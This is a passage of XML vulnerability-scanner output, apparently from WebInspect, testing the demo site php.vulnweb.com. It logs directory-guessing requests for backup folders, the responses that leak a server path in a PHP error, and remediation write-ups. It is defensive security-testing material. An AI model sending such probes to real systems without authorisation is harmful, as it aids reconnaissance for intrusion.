]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<a href="https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)"> OWASP - Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)  </a><br /><a href="https://cwe.mitre.org/data/definitions/200.html">CWE - 200 Information Exposure  </a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="8B37B7739FC0AF956B2D16094BA76877"><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-1%20-%20Copy/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="8B37B7739FC0AF956B2D16094BA76877";PSID="F425747E598F9ABB32C9C02592DFF52C";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11486";Engine="Directory+Extension+Addition";SmartMode="4";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="809ab5ab";
X-Request-Memo: ID="48e574aa";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:37 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 136


Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></RawResponse><Request id="8B37B7739FC0AF956B2D16094BA76877"><Method>GET</Method><Path>/Mod_Rewrite_Shop/BuyProduct-1%20-%20Copy/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="8B37B7739FC0AF956B2D16094BA76877";PSID="F425747E598F9ABB32C9C02592DFF52C";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11486";Engine="Directory+Extension+Addition";SmartMode="4";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="809ab5ab";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="48e574aa";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:37 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>136</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="6EDD4CEAC24A3B1BA98A83DFF2BF9227"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-2%20(copy)/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="eb1ef1f5-1a4a-43f3-b0de-48cb8d106d6a"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="367" length="33" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue><Issue id="8645fa62-8279-49ef-8fd3-d3c6042475ed"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11455</EngineType><AttackHTTPRequest><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-2%20(copy)/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="6EDD4CEAC24A3B1BA98A83DFF2BF9227";PSID="64D21A7DC85A587EEA0D3D242B678FAC";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11485";Engine="Directory+Extension+Addition";SmartMode="4";tid="44";tt="40";
X-RequestManager-Memo: sid="37";smi="0";sc="1";ID="5b07a448";
X-Request-Memo: ID="906ce3b2";sc="1";tid="44";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11485</VulnerabilityID><Severity>3</Severity><Name>Backup Directory ( (copy))</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[WebInspect has detected a backup directory with (copy) suffix on the target server. It might contain sensitive artifacts such as source code and design documents relevant to the site. Based on the directory contents, the attacker can gain sensitive information about the site architecture, database and network access credential details, encryption keys, and so forth from these files. The attacker may use information obtained to create precise targeted attacks, which may not otherwise be feasible, against the application.  
]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[An attacker may use the information obtained from the backup directory contents to craft a precise targeted attack against the web application. Such attacks can include, but are not limited to, SQL injection, remote file system access to overwrite or inject malware, and database manipulation.  

]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Browse to ~FullURL~ and inspect the content. Response should be a return with HTTP status code 200 and should not match target site’s file not found response.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Prohibit storage of backup directories on webroot. Further QA can include test cases to look for the presence of backup directories in the webroot to ensure none are left in publicly accessible folders of the web application.  
]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<a href="https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)"> OWASP - Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)  </a><br /><a href="https://cwe.mitre.org/data/definitions/200.html">CWE - 200 Information Exposure  </a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="6EDD4CEAC24A3B1BA98A83DFF2BF9227"><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-2%20(copy)/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="6EDD4CEAC24A3B1BA98A83DFF2BF9227";PSID="64D21A7DC85A587EEA0D3D242B678FAC";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11485";Engine="Directory+Extension+Addition";SmartMode="4";tid="44";tt="40";
X-RequestManager-Memo: sid="37";smi="0";sc="1";ID="5b07a448";
X-Request-Memo: ID="906ce3b2";sc="1";tid="44";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:37 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 136


Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></RawResponse><Request id="6EDD4CEAC24A3B1BA98A83DFF2BF9227"><Method>GET</Method><Path>/Mod_Rewrite_Shop/BuyProduct-2%20(copy)/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="6EDD4CEAC24A3B1BA98A83DFF2BF9227";PSID="64D21A7DC85A587EEA0D3D242B678FAC";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11485";Engine="Directory+Extension+Addition";SmartMode="4";tid="44";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="37";smi="0";sc="1";ID="5b07a448";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="906ce3b2";sc="1";tid="44";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:37 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>136</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="C50A8536F39315FE8F50E594B46A8AD8"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-2%20-%20Copy/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="215b6ea4-9839-4aaa-a502-36c55571347f"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="367" length="33" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue><Issue id="52cb3d6a-c721-4fdf-b233-12705216765b"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11455</EngineType><AttackHTTPRequest><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-2%20-%20Copy/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="C50A8536F39315FE8F50E594B46A8AD8";PSID="64D21A7DC85A587EEA0D3D242B678FAC";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11486";Engine="Directory+Extension+Addition";SmartMode="4";tid="44";tt="40";
X-RequestManager-Memo: sid="37";smi="0";sc="1";ID="a68f61e1";
X-Request-Memo: ID="03c6afde";sc="1";tid="44";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11486</VulnerabilityID><Severity>3</Severity><Name>Backup Directory ( - Copy)</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[WebInspect has detected a backup directory with -Copy suffix on the target server. It might contain sensitive artifacts such as source code and design documents relevant to the site. Based on the directory contents, the attacker can gain sensitive information about the site architecture, database and network access credential details, encryption keys, and so forth from these files. The attacker may use information obtained to create precise targeted attacks, which may not otherwise be feasible, against the application.  ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[An attacker may use the information obtained from the backup directory contents to craft a precise targeted attack against the web application. Such attacks can include, but are not limited to, SQL injection, remote file system access to overwrite or inject malware, and database manipulation.  
]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Browse to ~FullURL~ and inspect the content. Response should be a return with HTTP status code 200 and should not match target site’s file not found response.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Prohibit storage of backup directories on webroot. Further QA can include test cases to look for the presence of backup directories in the webroot to ensure none are left in publicly accessible folders of the web application.  
]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<a href="https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)"> OWASP - Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)  </a><br /><a href="https://cwe.mitre.org/data/definitions/200.html">CWE - 200 Information Exposure  </a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="C50A8536F39315FE8F50E594B46A8AD8"><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-2%20-%20Copy/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="C50A8536F39315FE8F50E594B46A8AD8";PSID="64D21A7DC85A587EEA0D3D242B678FAC";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11486";Engine="Directory+Extension+Addition";SmartMode="4";tid="44";tt="40";
X-RequestManager-Memo: sid="37";smi="0";sc="1";ID="a68f61e1";
X-Request-Memo: ID="03c6afde";sc="1";tid="44";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:38 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 136


Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></RawResponse><Request id="C50A8536F39315FE8F50E594B46A8AD8"><Method>GET</Method><Path>/Mod_Rewrite_Shop/BuyProduct-2%20-%20Copy/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="C50A8536F39315FE8F50E594B46A8AD8";PSID="64D21A7DC85A587EEA0D3D242B678FAC";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11486";Engine="Directory+Extension+Addition";SmartMode="4";tid="44";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="37";smi="0";sc="1";ID="a68f61e1";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="03c6afde";sc="1";tid="44";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:38 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>136</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="052AF915C2E09AA040C60C7DD02CEC18"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-3%20(copy)/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="54e814a1-28bc-4b82-92a1-8f317e49a796"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="367" length="33" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
